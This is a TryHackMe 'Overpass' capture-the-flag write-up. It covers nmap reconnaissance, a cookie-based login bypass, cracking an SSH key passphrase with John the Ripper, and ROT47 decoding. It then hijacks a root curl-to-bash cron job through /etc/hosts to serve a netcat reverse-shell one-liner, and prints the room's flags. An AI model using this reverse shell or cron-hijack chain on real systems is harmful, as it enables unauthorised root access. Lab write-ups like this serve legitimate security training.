```bash
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# nmap -sC -sV -A 10.10.48.130 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-07 20:47 +08
Nmap scan report for 10.10.48.130
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/7%OT=22%CT=1%CU=36516%PV=Y%DS=2%DC=T%G=Y%TM=61D8369C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   196.00 ms 10.8.0.1
2   196.18 ms 10.10.48.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.94 seconds

```

![homepage.png](image/Overpass/homepage.png)

![adminpage.png](image/Overpass/adminpage.png)

Trying out `admin:admin` or basic SQL injection doesn’t work..

![adminpage-sourcecode.png](image/Overpass/adminpage-sourcecode.png)

Seems like there is an interesting `login.js` script!

![login-js.png](image/Overpass/login-js.png)

According to the source code, we can bypass the login by setting the cookie key to `SessionToken`.

![set-cookie.png](image/Overpass/set-cookie.png)

![adminpage-success.png](image/Overpass/adminpage-success.png)

Seems like we have an private rsa key here.. let’s use it

```bash
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# mousepad id_rsa  
                                                                                                                      
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# cat id_rsa                          
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY----- 

┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# chmod 600 id_rsa 

┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# ssh -i id_rsa james@10.10.48.130               
The authenticity of host '10.10.48.130 (10.10.48.130)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.48.130' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

```

Seems like we have to find out the passphrase for `james`.. let’s try using `ssh2john` on the `id_rsa` and then use John The Ripper to crack the passphrase.

```bash
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# python3 ssh2john.py id_rsa > hash.txt                                                                                                                      
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# cat hash.txt   
id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
                                                                                                                      
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2022-01-07 21:28) 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The passphrase is `james13`!

```bash
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# ssh -i id_rsa james@10.10.48.130
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan  7 13:39:06 UTC 2022

  System load:  0.0                Processes:           87
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.48.130
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1

james@overpass-prod:~$ ls -la
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

There is an interesting file called `.overpass` which has this encrypted string `,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.`

Let’s decode the encrypted string using [Decoder](https://pypi.org/project/decoder/)!

```bash
┌──(root💀shiro)-[/home/shiro/TryHackMe/Overpass]
└─# decoder -s ',LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.'  
________                          .___            
\______ \   ____   ____  ____   __| _/___________ 
 |    |  \_/ __ \_/ ___\/  _ \ / __ |/ __ \_  __ \
 |    `   \  ___/\  \__(  <_> ) /_/ \  ___/|  | \/
/_______  /\___  >\___  >____/\____ |\___  >__|   
        \/     \/     \/           \/    \/       

              Automate the Manual :)

---
[#] Provided string: ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
---

-------------------------------------------------------

[%] Common Encodings
[+] AtBash decoded: OJJRJQWVJJZWWJRJWQXSQZVUXJM

-------------------------------------------------------

[%] Rot Encodings (13 - 47)

[+] ROT13 decoded: ,YD?2>6DvD$WQR6>D[DN2QQDvDQ2W5P2U?=W:?8N:4RSP6DA.
[+] ROT47 decoded: [{"name":"System","pass":"saydrawnlyingpicture"}]

-------------------------------------------------------

[%] Ceaser Cipher (with shifts 0 - 9)

[&] Shift: 0 Decoded: ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
[&] Shift: 1 Decoded: ,KP?1>5PhP$ICD5>P[PZ1CCPhPC1I4B1G?=I:?7Z:3DEB5PM.
[&] Shift: 2 Decoded: ,JO?0>4OgO$HBC4>O[OY0BBOgOB0H3A0F?=H:?6Y:2CDA4OL.
[&] Shift: 3 Decoded: ,IN?9>3NfN$GAB3>N[NX9AANfNA9G2Z9E?=G:?5X:1BCZ3NK.
[&] Shift: 4 Decoded: ,HM?8>2MeM$FZA2>M[MW8ZZMeMZ8F1Y8D?=F:?4W:0ABY2MJ.
[&] Shift: 5 Decoded: ,GL?7>1LdL$EYZ1>L[LV7YYLdLY7E0X7C?=E:?3V:9ZAX1LI.
[&] Shift: 6 Decoded: ,FK?6>0KcK$DXY0>K[KU6XXKcKX6D9W6B?=D:?2U:8YZW0KH.
[&] Shift: 7 Decoded: ,EJ?5>9JbJ$CWX9>J[JT5WWJbJW5C8V5A?=C:?1T:7XYV9JG.
[&] Shift: 8 Decoded: ,DI?4>8IaI$BVW8>I[IS4VVIaIV4B7U4Z?=B:?0S:6WXU8IF.
[&] Shift: 9 Decoded: ,CH?3>7HzH$AUV7>H[HR3UUHzHU3A6T3Y?=A:?9R:5VWT7HE.

-------------------------------------------------------
```



Seems like the password for `james` is `saydrawnlyingpicture`.

```bash
james@overpass-prod:~$ su root
Password: 
su: Authentication failure
james@overpass-prod:~$ su james
Password: 
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
```

It seems that the password only works for `james` and he does not have any sudo privileges

```bash
-- Own Terminal --
┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ sudo python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.187.240 - - [08/Jan/2022 22:01:03] "GET /linpeas.sh HTTP/1.1" 200 -

-- SSH -- 
james@overpass-prod:~$ ping 10.8.217.26
PING 10.8.217.26 (10.8.217.26) 56(84) bytes of data.
64 bytes from 10.8.217.26: icmp_seq=1 ttl=63 time=198 ms
64 bytes from 10.8.217.26: icmp_seq=2 ttl=63 time=329 ms
^C
--- 10.8.217.26 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 198.618/264.037/329.456/65.419 ms
james@overpass-prod:~$ wget http://10.8.217.26/linpeas.sh && chmod +x linpeas.sh
--2022-01-08 14:01:03--  http://10.8.217.26/linpeas.sh
Connecting to 10.8.217.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 762836 (745K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[==================>] 744.96K   242KB/s    in 3.1s    

2022-01-08 14:01:07 (242 KB/s) - ‘linpeas.sh’ saved [762836/762836]
```

Running `linpeas.sh` shows this interesting warning

```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Seems like this script curls from `overpass.thm`. Let’s check what could that be.

```bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Seems like it’s just calling the localhost. Let’s change it to our IP address! OwO

```bash
james@overpass-prod:~$ nano /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.8.217.26 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ ping overpass.thm
PING overpass.thm (10.8.217.26) 56(84) bytes of data.
64 bytes from overpass.thm (10.8.217.26): icmp_seq=1 ttl=63 time=199 ms
64 bytes from overpass.thm (10.8.217.26): icmp_seq=2 ttl=63 time=199 ms
^C
--- overpass.thm ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 199.023/199.270/199.518/0.510 ms
```

Seems like it’s connected to our machine now. Let’s try to emulate the folders for the script to curl from.

```bash
┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ sudo mkdir -p downloads/src/
                  
┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ ls
downloads  hash.txt  id_rsa  linpeas.sh  ssh2john.py

-- Use a reverse shell script from https://github.com/LasCC/Hack-Tools --

┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ sudo mousepad downloads/src/buildscript.sh
                 
┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ cat downloads/src/buildscript.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.217.26 1234 >/tmp/f

┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ chmod +x downloads/src/buildscript.sh                    
chmod: changing permissions of 'downloads/src/buildscript.sh': Operation not permitted
                                             
┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ sudo chmod +x downloads/src/buildscript.sh

-- Turn on netcat on another terminal with nc -nlvp 1234 --

┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.187.240 - - [08/Jan/2022 23:03:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

-- Another Terminal --

┌──(shiro㉿shiro)-[~/TryHackMe/Overpass]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.217.26] from (UNKNOWN) [10.10.187.240] 46964
/bin/sh: 0: can't access tty; job control turned off
 whoami 
root
# ls     	
buildStatus
builds
go
root.txt
src
# cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```





